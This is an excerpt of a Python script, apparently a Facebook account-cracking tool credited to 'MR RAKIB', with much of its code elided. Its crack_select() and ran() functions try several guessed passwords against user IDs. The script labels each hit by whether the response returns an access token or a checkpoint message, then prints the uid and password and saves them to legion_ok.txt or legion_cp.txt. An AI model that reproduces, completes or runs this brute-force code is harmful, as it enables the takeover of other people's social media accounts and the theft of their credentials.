...
\033[1;37m========================================================
\033[1;37m[*] \033[1;91m AUTHOR   ➤ \x1b[1;37mMR RAKIB
\033[1;37m[*] \033[1;91m FACEBOOK ➤ \x1b[1;37mMR RAKIB
\033[1;37m[*] \033[1;91m GITHUB   ➤ \x1b[1;37mhttps://github.com/MRRAKIB404.CYBER
\033[1;37m========================================================"""
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;92m [RAKIB-CP] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [RAKIB-OK] "+uid+" | "+pass1+"\033[0;97m")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;92m [RAKIB-CP] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("legion_ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;37m [RAKIB-OK] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("legion_cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;92m [RAKIB-CP] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("legion_ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [RAKIB-OK] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("legion_cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;92m [RAKIB-CP] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("legion_ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;37m [RAKIB-OK] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("legion_cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;92m [RAKIB-CP] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("legion_ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;37m [RAKIB-OK] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("legion_cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
...
def ran():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m[RAKIB-CP] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				ok = open("legion_ok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [RAKIB-OK] "+k+co+user+" | "+pass1+"\033[0;97m")
					cp = open("legion_cp.txt", "a")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m[RAKIB-CP] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						ok = open("legion_ok.txt", "a")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [RAKIB-OK] "+k+co+user+" | "+pass3+"\033[0;97m")
									cp = open("legion_cp.txt", "a")
